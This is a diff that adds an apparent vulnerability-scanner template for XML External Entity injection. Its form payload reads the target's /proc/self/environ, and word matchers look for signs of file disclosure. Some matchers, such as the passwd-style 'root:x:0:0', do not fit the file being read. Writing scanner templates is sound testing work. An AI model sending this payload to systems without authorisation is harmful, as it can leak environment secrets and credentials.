@@ -1,0 +1,25 @@
+id: xxe5-0865
+name: 'XXE read in form'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via form'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      form:
+        - '<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><Envelope>&xxe;</Envelope>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
